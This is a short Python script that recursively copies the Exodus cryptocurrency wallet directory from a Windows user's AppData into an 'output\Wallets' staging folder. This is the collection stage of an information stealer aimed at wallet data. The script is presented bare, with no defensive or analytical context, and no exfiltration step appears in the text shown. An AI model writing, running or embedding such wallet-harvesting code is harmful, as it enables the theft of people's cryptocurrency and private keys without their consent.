import os

user = os.path.expanduser("~")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            try:
                with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                    f_write.write(f_read.read())
            except IOError as e:
                print(f"Failed to copy {src_path} to {dst_path}: {e}")

def exo():
    exodus_path = os.path.join(user, "AppData\\Roaming\\Exodus")
    temp_exodus_path = os.path.join(user, "AppData\\Roaming\\output\\Wallets\\Exodus")

    if os.path.exists(exodus_path):
        
        copy_directory(exodus_path, temp_exodus_path)
    else:
        print("Source directory does not exist.")

exo()
